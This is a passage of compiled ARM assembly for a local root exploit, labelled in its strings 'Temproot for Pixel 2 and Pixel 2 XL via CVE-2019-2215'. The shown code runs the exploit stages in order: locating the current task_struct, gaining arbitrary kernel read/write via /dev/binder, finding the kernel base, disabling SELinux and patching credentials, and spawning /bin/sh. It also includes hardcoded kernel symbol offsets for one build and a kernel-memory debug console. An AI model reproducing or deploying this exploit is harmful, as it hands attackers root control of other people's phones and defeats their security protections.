	str	r0, [r11, #-4]
	b	.LBB18_19
.LBB18_19:
	ldr	r0, [r11, #-4]
	mov	sp, r11
	pop	{r11, lr}
	bx	lr
	.p2align	2
@ %bb.20:
.LCPI18_0:
	.long	.L.str.49-(.LPC18_0+8)
.LCPI18_1:
	.long	.L.str.34-(.LPC18_1+8)
.LCPI18_2:
	.long	con_parse_hexbytes.hexbyte-(.LPC18_2+8)
.LCPI18_3:
	.long	con_parse_hexbytes.hexbyte-(.LPC18_3+8)
.Lfunc_end18:
	.size	con_parse_hexbytes, .Lfunc_end18-con_parse_hexbytes
	.cantunwind
	.fnend
                                        @ -- End function
	.globl	execute_stage           @ -- Begin function execute_stage
	.p2align	2
	.type	execute_stage,%function
	.code	32                      @ @execute_stage
execute_stage:
	.fnstart
@ %bb.0:
	.save	{r11, lr}
	push	{r11, lr}
	.setfp	r11, sp
	mov	r11, sp
	.pad	#8
	sub	sp, sp, #8
	str	r0, [sp, #4]
	ldr	r0, [sp, #4]
	ldr	r1, .LCPI19_0
.LPC19_0:
	add	r1, pc, r1
	add	r0, r1, r0, lsl #3
	ldr	r0, [r0, #4]
	ldr	r2, .LCPI19_1
.LPC19_1:
	add	r2, pc, r2
	str	r0, [r2]
	ldr	r0, [sp, #4]
	ldr	r0, [r1, r0, lsl #3]
	mov	lr, pc
	bx	r0
	ldr	r0, .LCPI19_2
.LPC19_2:
	ldr	r0, [pc, r0]
	cmp	r0, #0
	beq	.LBB19_5
	b	.LBB19_1
.LBB19_1:
	ldr	r0, .LCPI19_3
.LPC19_3:
	ldr	r0, [pc, r0]
	cmp	r0, #0
	beq	.LBB19_5
	b	.LBB19_2
.LBB19_2:
	ldr	r0, [sp, #4]
	cmp	r0, #3
	bne	.LBB19_4
	b	.LBB19_3
.LBB19_3:
	ldr	r0, .LCPI19_4
.LPC19_4:
	add	r0, pc, r0
	ldr	r0, [r0, #4]
	ldr	r1, .LCPI19_5
.LPC19_5:
	ldr	r1, [pc, r1]
	orr	r0, r1, r0
	cmp	r0, #0
	beq	.LBB19_5
	b	.LBB19_4
.LBB19_4:
	ldr	r1, .LCPI19_6
.LPC19_6:
	ldr	r1, [pc, r1]
	ldr	r0, .LCPI19_7
.LPC19_7:
	add	r0, pc, r0
	bl	printf
	b	.LBB19_5
.LBB19_5:
	mov	sp, r11
	pop	{r11, lr}
	bx	lr
	.p2align	2
@ %bb.6:
.LCPI19_0:
	.long	stages-(.LPC19_0+8)
.LCPI19_1:
	.long	stage_desc-(.LPC19_1+8)
.LCPI19_2:
	.long	stage_desc-(.LPC19_2+8)
.LCPI19_3:
	.long	pid-(.LPC19_3+8)
.LCPI19_4:
	.long	kernel_base-(.LPC19_4+8)
.LCPI19_5:
	.long	kernel_base-(.LPC19_5+8)
.LCPI19_6:
	.long	stage_desc-(.LPC19_6+8)
.LCPI19_7:
	.long	.L.str.60-(.LPC19_7+8)
.Lfunc_end19:
	.size	execute_stage, .Lfunc_end19-execute_stage
	.cantunwind
	.fnend
                                        @ -- End function
	.globl	notify_stage_failure    @ -- Begin function notify_stage_failure
	.p2align	2
	.type	notify_stage_failure,%function
	.code	32                      @ @notify_stage_failure
notify_stage_failure:
	.fnstart
@ %bb.0:
	.save	{r11, lr}
	push	{r11, lr}
	.setfp	r11, sp
	mov	r11, sp
	ldr	r0, .LCPI20_0
.LPC20_0:
	ldr	r0, [pc, r0]
	cmp	r0, #0
	beq	.LBB20_3
	b	.LBB20_1
.LBB20_1:
	ldr	r0, .LCPI20_1
.LPC20_1:
	ldr	r0, [pc, r0]
	cmp	r0, #0
	beq	.LBB20_3
	b	.LBB20_2
.LBB20_2:
	ldr	r0, .LCPI20_2
.LPC20_2:
	ldr	r0, [pc, r0]
	ldr	r0, [r0]
	ldr	r2, .LCPI20_3
.LPC20_3:
	ldr	r2, [pc, r2]
	ldr	r1, .LCPI20_4
.LPC20_4:
	add	r1, pc, r1
	bl	fprintf
	b	.LBB20_3
.LBB20_3:
	pop	{r11, lr}
	bx	lr
	.p2align	2
@ %bb.4:
.LCPI20_0:
	.long	stage_desc-(.LPC20_0+8)
.LCPI20_1:
	.long	pid-(.LPC20_1+8)
.LCPI20_2:
.Ltmp2:
	.long	stderr(GOT_PREL)-((.LPC20_2+8)-.Ltmp2)
.LCPI20_3:
	.long	stage_desc-(.LPC20_3+8)
.LCPI20_4:
	.long	.L.str.61-(.LPC20_4+8)
.Lfunc_end20:
	.size	notify_stage_failure, .Lfunc_end20-notify_stage_failure
	.cantunwind
	.fnend
                                        @ -- End function
	.globl	main                    @ -- Begin function main
	.p2align	2
	.type	main,%function
	.code	32                      @ @main
main:
	.fnstart
@ %bb.0:
	.save	{r11, lr}
	push	{r11, lr}
	.setfp	r11, sp
	mov	r11, sp
	.pad	#24
	sub	sp, sp, #24
	mov	r2, #0
	str	r2, [r11, #-4]
	str	r0, [r11, #-8]
	str	r1, [sp, #12]
	ldr	r0, .LCPI21_0
.LPC21_0:
	add	r0, pc, r0
	str	r2, [sp, #8]            @ 4-byte Spill
	bl	atexit
	ldr	r1, [r11, #-8]
	cmp	r1, #2
	ldr	r1, [sp, #8]            @ 4-byte Reload
	str	r1, [sp, #4]            @ 4-byte Spill
	bne	.LBB21_2
	b	.LBB21_1
.LBB21_1:
	ldr	r0, [sp, #12]
	ldr	r0, [r0, #4]
	ldr	r1, .LCPI21_1
.LPC21_1:
	add	r1, pc, r1
	bl	strcmp
	rsbs	r1, r0, #0
	adc	r0, r0, r1
	str	r0, [sp, #4]            @ 4-byte Spill
	b	.LBB21_2
.LBB21_2:
	ldr	r0, [sp, #4]            @ 4-byte Reload
	and	r0, r0, #1
	ldr	r1, .LCPI21_2
.LPC21_2:
	add	r1, pc, r1
	str	r0, [r1]
	ldr	r0, .LCPI21_3
.LPC21_3:
	add	r0, pc, r0
	bl	printf
	mov	r1, #0
	str	r0, [sp]                @ 4-byte Spill
	mov	r0, r1
	bl	execute_stage
	mov	r0, #1
	bl	execute_stage
	mov	r0, #2
	bl	execute_stage
	mov	r0, #3
	bl	execute_stage
	ldr	r0, .LCPI21_4
.LPC21_4:
	ldr	r0, [pc, r0]
	cmp	r0, #0
	beq	.LBB21_6
	b	.LBB21_3
.LBB21_3:
	ldr	r0, .LCPI21_5
.LPC21_5:
	add	r0, pc, r0
	ldr	r0, [r0, #4]
	ldr	r1, .LCPI21_6
.LPC21_6:
	ldr	r1, [pc, r1]
	orr	r0, r1, r0
	cmp	r0, #0
	bne	.LBB21_5
	b	.LBB21_4
.LBB21_4:
	bl	notify_stage_failure
	ldr	r0, .LCPI21_7
.LPC21_7:
	add	r0, pc, r0
	bl	warnx
	b	.LBB21_5
.LBB21_5:
	mov	r0, #6
	bl	execute_stage
	b	.LBB21_7
.LBB21_6:
	mov	r0, #4
	bl	execute_stage
	mov	r0, #5
	bl	execute_stage
	b	.LBB21_7
.LBB21_7:
	mov	r0, #0
	mov	sp, r11
	pop	{r11, lr}
	bx	lr
	.p2align	2
@ %bb.8:
.LCPI21_0:
	.long	notify_stage_failure-(.LPC21_0+8)
.LCPI21_1:
	.long	.L.str.62-(.LPC21_1+8)
.LCPI21_2:
	.long	debugging-(.LPC21_2+8)
.LCPI21_3:
	.long	.L.str.63-(.LPC21_3+8)
.LCPI21_4:
	.long	debugging-(.LPC21_4+8)
.LCPI21_5:
	.long	kernel_base-(.LPC21_5+8)
.LCPI21_6:
	.long	kernel_base-(.LPC21_6+8)
.LCPI21_7:
	.long	.L.str.64-(.LPC21_7+8)
.Lfunc_end21:
	.size	main, .Lfunc_end21-main
	.cantunwind
	.fnend
                                        @ -- End function
	.type	ksym_init_task,%object  @ @ksym_init_task
	.section	.rodata,"a",%progbits
	.globl	ksym_init_task
	.p2align	2
ksym_init_task:
	.long	33707984                @ 0x20257d0
	.size	ksym_init_task, 4

	.type	ksym_init_user_ns,%object @ @ksym_init_user_ns
	.globl	ksym_init_user_ns
	.p2align	2
ksym_init_user_ns:
	.long	33747656                @ 0x202f2c8
	.size	ksym_init_user_ns, 4

	.type	ksym_selinux_enabled,%object @ @ksym_selinux_enabled
	.globl	ksym_selinux_enabled
	.p2align	2
ksym_selinux_enabled:
	.long	33961856                @ 0x2063780
	.size	ksym_selinux_enabled, 4

	.type	ksym_selinux_enforcing,%object @ @ksym_selinux_enforcing
	.globl	ksym_selinux_enforcing
	.p2align	2
ksym_selinux_enforcing:
	.long	37545128                @ 0x23ce4a8
	.size	ksym_selinux_enforcing, 4

	.type	iovs_sz,%object         @ @iovs_sz
	.globl	iovs_sz
	.p2align	2
iovs_sz:
	.long	50                      @ 0x32
	.size	iovs_sz, 4

	.type	iov_idx,%object         @ @iov_idx
	.globl	iov_idx
	.p2align	2
iov_idx:
	.long	20                      @ 0x14
	.size	iov_idx, 4

	.type	.L.str,%object          @ @.str
	.section	.rodata.str1.1,"aMS",%progbits,1
.L.str:
	.asciz	"kernel writes over PAGE_SIZE are messy, tried 0x%lx"
	.size	.L.str, 52

	.type	kernel_rw_pipe,%object  @ @kernel_rw_pipe
	.comm	kernel_rw_pipe,8,4
	.type	.L.str.1,%object        @ @.str.1
.L.str.1:
	.asciz	"kwrite failed to load userspace buffer"
	.size	.L.str.1, 39

	.type	.L.str.2,%object        @ @.str.2
.L.str.2:
	.asciz	"kwrite failed to overwrite kernel memory"
	.size	.L.str.2, 41

	.type	.L.str.3,%object        @ @.str.3
.L.str.3:
	.asciz	"kernel reads over PAGE_SIZE are messy, tried 0x%lx"
	.size	.L.str.3, 51

	.type	.L.str.4,%object        @ @.str.4
.L.str.4:
	.asciz	"kread failed to read kernel memory"
	.size	.L.str.4, 35

	.type	.L.str.5,%object        @ @.str.5
.L.str.5:
	.asciz	"kread failed to write out to userspace"
	.size	.L.str.5, 39

	.type	pid,%object             @ @pid
	.comm	pid,4,4
	.type	.L.str.6,%object        @ @.str.6
.L.str.6:
	.asciz	"determine kernel release"
	.size	.L.str.6, 25

	.type	.L.str.7,%object        @ @.str.7
.L.str.7:
	.asciz	"4.4.177-g83bee1dc48e8"
	.size	.L.str.7, 22

	.type	.L.str.8,%object        @ @.str.8
.L.str.8:
	.asciz	"kernel version-BuildID is not '4.4.177-g83bee1dc48e8'"
	.size	.L.str.8, 54

	.type	dummy_page,%object      @ @dummy_page
	.comm	dummy_page,4,4
	.type	.L.str.9,%object        @ @.str.9
.L.str.9:
	.asciz	"mmap 4g aligned"
	.size	.L.str.9, 16

	.type	.L.str.10,%object       @ @.str.10
.L.str.10:
	.asciz	"kernel_rw_pipe"
	.size	.L.str.10, 15

	.type	.L.str.11,%object       @ @.str.11
.L.str.11:
	.asciz	"/dev/binder"
	.size	.L.str.11, 12

	.type	binder_fd,%object       @ @binder_fd
	.comm	binder_fd,4,4
	.type	epoll_fd,%object        @ @epoll_fd
	.comm	epoll_fd,4,4
	.type	.L__const.find_current.event,%object @ @__const.find_current.event
	.section	.rodata.cst16,"aM",%progbits,16
	.p2align	3
.L__const.find_current.event:
	.long	1                       @ 0x1
	.zero	4
	.zero	8
	.size	.L__const.find_current.event, 16

	.type	.L.str.12,%object       @ @.str.12
	.section	.rodata.str1.1,"aMS",%progbits,1
.L.str.12:
	.asciz	"epoll_add"
	.size	.L.str.12, 10

	.type	.L.str.13,%object       @ @.str.13
.L.str.13:
	.asciz	"pipe"
	.size	.L.str.13, 5

	.type	.L.str.14,%object       @ @.str.14
.L.str.14:
	.asciz	"pipe size"
	.size	.L.str.14, 10

	.type	find_current.page_buffer,%object @ @find_current.page_buffer
	.local	find_current.page_buffer
	.comm	find_current.page_buffer,4096,1
	.type	.L.str.15,%object       @ @.str.15
.L.str.15:
	.asciz	"fork"
	.size	.L.str.15, 5

	.type	.L.str.16,%object       @ @.str.16
.L.str.16:
	.asciz	"read full pipe"
	.size	.L.str.16, 15

	.type	.L.str.17,%object       @ @.str.17
.L.str.17:
	.asciz	"writev() returns 0x%lx, expected 0x%lx\n"
	.size	.L.str.17, 40

	.type	.L.str.18,%object       @ @.str.18
.L.str.18:
	.asciz	"wait"
	.size	.L.str.18, 5

	.type	current,%object         @ @current
	.comm	current,8,8
	.type	.L__const.obtain_kernel_rw.event,%object @ @__const.obtain_kernel_rw.event
	.section	.rodata.cst16,"aM",%progbits,16
	.p2align	3
.L__const.obtain_kernel_rw.event:
	.long	1                       @ 0x1
	.zero	4
	.zero	8
	.size	.L__const.obtain_kernel_rw.event, 16

	.type	.L.str.19,%object       @ @.str.19
	.section	.rodata.str1.1,"aMS",%progbits,1
.L.str.19:
	.asciz	"socketpair"
	.size	.L.str.19, 11

	.type	.L.str.20,%object       @ @.str.20
.L.str.20:
	.asciz	"X"
	.size	.L.str.20, 2

	.type	.L.str.21,%object       @ @.str.21
.L.str.21:
	.asciz	"write socket dummy byte"
	.size	.L.str.21, 24

	.type	.L.str.22,%object       @ @.str.22
.L.str.22:
	.asciz	"write second chunk to socket"
	.size	.L.str.22, 29

	.type	.L.str.23,%object       @ @.str.23
.L.str.23:
	.asciz	"recvmsg() returns %ld, expected %lu\n"
	.size	.L.str.23, 37

	.type	kernel_base,%object     @ @kernel_base
	.comm	kernel_base,8,8
	.type	debugging,%object       @ @debugging
	.comm	debugging,4,4
	.type	.L.str.24,%object       @ @.str.24
.L.str.24:
	.asciz	"bad kernel base (not 0x...000)"
	.size	.L.str.24, 31

	.type	.L.str.25,%object       @ @.str.25
.L.str.25:
	.asciz	"bad kernel base (init_task not where expected)"
	.size	.L.str.25, 47

	.type	.L.str.26,%object       @ @.str.26
.L.str.26:
	.asciz	"bad cred (current->real_cred->uid not our own uid)"
	.size	.L.str.26, 51

	.type	.L.str.27,%object       @ @.str.27
.L.str.27:
	.asciz	"bad cred (current->cred->uid not our own uid)"
	.size	.L.str.27, 46

	.type	.L.str.28,%object       @ @.str.28
.L.str.28:
	.asciz	"did some patching, but our uid is not 0"
	.size	.L.str.28, 40

	.type	.L.str.29,%object       @ @.str.29
.L.str.29:
	.asciz	"/bin/sh"
	.size	.L.str.29, 8

	.type	.L.str.30,%object       @ @.str.30
.L.str.30:
	.asciz	"launch shell"
	.size	.L.str.30, 13

	.type	.L.str.31,%object       @ @.str.31
.L.str.31:
	.asciz	"launching debug console; enter 'help' for quick help\n"
	.size	.L.str.31, 54

	.type	.L.str.32,%object       @ @.str.32
.L.str.32:
	.asciz	"debug> "
	.size	.L.str.32, 8

	.type	.L.str.33,%object       @ @.str.33
.L.str.33:
	.asciz	"read stdin"
	.size	.L.str.33, 11

	.type	.L.str.34,%object       @ @.str.34
.L.str.34:
	.asciz	" \t\r\n\007"
	.size	.L.str.34, 6

	.type	.L.str.35,%object       @ @.str.35
.L.str.35:
	.asciz	"print"
	.size	.L.str.35, 6

	.type	.L.str.36,%object       @ @.str.36
.L.str.36:
	.asciz	"%lx kernel_base\n"
	.size	.L.str.36, 17

	.type	.L.str.37,%object       @ @.str.37
.L.str.37:
	.asciz	"%lx init_task\n"
	.size	.L.str.37, 15

	.type	.L.str.38,%object       @ @.str.38
.L.str.38:
	.asciz	"%lx init_user_ns\n"
	.size	.L.str.38, 18

	.type	.L.str.39,%object       @ @.str.39
.L.str.39:
	.asciz	"%lx selinux_enabled\n"
	.size	.L.str.39, 21

	.type	.L.str.40,%object       @ @.str.40
.L.str.40:
	.asciz	"%lx selinux_enforcing\n"
	.size	.L.str.40, 23

	.type	.L.str.41,%object       @ @.str.41
.L.str.41:
	.asciz	"%lx current\n"
	.size	.L.str.41, 13

	.type	.L.str.42,%object       @ @.str.42
.L.str.42:
	.asciz	"read"
	.size	.L.str.42, 5

	.type	.L.str.43,%object       @ @.str.43
.L.str.43:
	.asciz	"write"
	.size	.L.str.43, 6

	.type	.L.str.44,%object       @ @.str.44
.L.str.44:
	.asciz	"shell"
	.size	.L.str.44, 6

	.type	.L.str.45,%object       @ @.str.45
.L.str.45:
	.asciz	"help"
	.size	.L.str.45, 5

	.type	.L.str.46,%object       @ @.str.46
.L.str.46:
	.asciz	"quick help\n    print\n        print kernel base address, some kernel symbol offsets,\n        and address of current task_struct as hexstrings\n    read <kaddr> <len>\n        read <len> bytes from <kaddr> and display as a hexdump\n        <kaddr> is a hexstring not prefixed with 0x\n        <len> is 1-4096 or 0x1-0x1000\n    write <kaddr> <data>\n        write <data> to <kaddr>\n        <kaddr> is a hexstring not prefixed with 0x\n        <data> is 1-4096 hexbytes, spaces ignored, to be written *AS-IS*\n        e.g. if kaddr 0xffffffffdeadbeef contains an int, and you want to set\n        its value to 1, enter 'write ffffffffdeadbeef <data>', where <data> is\n        '01000000', '0100 0000', '01 00 0 0 00', etc. (our ARM is little-endian)\n    shell\n        launch a shell (hint: have we ~somehow~ become another user? :P)\n    help\n        print this help\n    exit\n        exit debug console\n"
	.size	.L.str.46, 890

	.type	.L.str.47,%object       @ @.str.47
.L.str.47:
	.asciz	"exit"
	.size	.L.str.47, 5

	.type	.L.str.48,%object       @ @.str.48
.L.str.48:
	.asciz	"woopz; enter 'help' for quick help\n"
	.size	.L.str.48, 36

	.type	con_parse_hexbytes.hexbyte,%object @ @con_parse_hexbytes.hexbyte
	.local	con_parse_hexbytes.hexbyte
	.comm	con_parse_hexbytes.hexbyte,3,1
	.type	.L.str.49,%object       @ @.str.49
.L.str.49:
	.asciz	"allocate memory"
	.size	.L.str.49, 16

	.type	con_kdump.line,%object  @ @con_kdump.line
	.local	con_kdump.line
	.comm	con_kdump.line,41,1
	.type	con_kdump.text,%object  @ @con_kdump.text
	.local	con_kdump.text
	.comm	con_kdump.text,17,1
	.type	.L.str.50,%object       @ @.str.50
.L.str.50:
	.asciz	"%02x "
	.size	.L.str.50, 6

	.type	.L.str.51,%object       @ @.str.51
.L.str.51:
	.asciz	"%02x"
	.size	.L.str.51, 5

	.type	.L.str.52,%object       @ @.str.52
.L.str.52:
	.asciz	"   "
	.size	.L.str.52, 4

	.type	.L.str.53,%object       @ @.str.53
.L.str.53:
	.asciz	"  "
	.size	.L.str.53, 3

	.type	.L.str.54,%object       @ @.str.54
.L.str.54:
	.asciz	"%016lx: %s %s\n"
	.size	.L.str.54, 15

	.type	.L.str.55,%object       @ @.str.55
.L.str.55:
	.asciz	"startup"
	.size	.L.str.55, 8

	.type	.L.str.56,%object       @ @.str.56
.L.str.56:
	.asciz	"find kernel address of current task_struct"
	.size	.L.str.56, 43

	.type	.L.str.57,%object       @ @.str.57
.L.str.57:
	.asciz	"obtain arbitrary kernel memory R/W"
	.size	.L.str.57, 35

	.type	.L.str.58,%object       @ @.str.58
.L.str.58:
	.asciz	"find kernel base address"
	.size	.L.str.58, 25

	.type	.L.str.59,%object       @ @.str.59
.L.str.59:
	.asciz	"bypass SELinux and patch current credentials"
	.size	.L.str.59, 45

	.type	stages,%object          @ @stages
	.data
	.globl	stages
	.p2align	2
stages:
	.long	prepare_globals
	.long	.L.str.55
	.long	find_current
	.long	.L.str.56
	.long	obtain_kernel_rw
	.long	.L.str.57
	.long	find_kernel_base
	.long	.L.str.58
	.long	patch_creds
	.long	.L.str.59
	.long	launch_shell
	.long	0
	.long	launch_debug_console
	.long	0
	.size	stages, 56

	.type	stage_desc,%object      @ @stage_desc
	.comm	stage_desc,4,4
	.type	.L.str.60,%object       @ @.str.60
	.section	.rodata.str1.1,"aMS",%progbits,1
.L.str.60:
	.asciz	"[+] %s\n"
	.size	.L.str.60, 8

	.type	.L.str.61,%object       @ @.str.61
.L.str.61:
	.asciz	"[-] %s failed\n"
	.size	.L.str.61, 15

	.type	.L.str.62,%object       @ @.str.62
.L.str.62:
	.asciz	"debug"
	.size	.L.str.62, 6

	.type	.L.str.63,%object       @ @.str.63
.L.str.63:
	.asciz	"Temproot for Pixel 2 and Pixel 2 XL via CVE-2019-2215\n"
	.size	.L.str.63, 55

	.type	.L.str.64,%object       @ @.str.64
.L.str.64:
	.asciz	"printed kernel offsets won't be reliable\n"
	.size	.L.str.64, 42


	.ident	"clang version 9.0.1 "
	.section	".note.GNU-stack","",%progbits
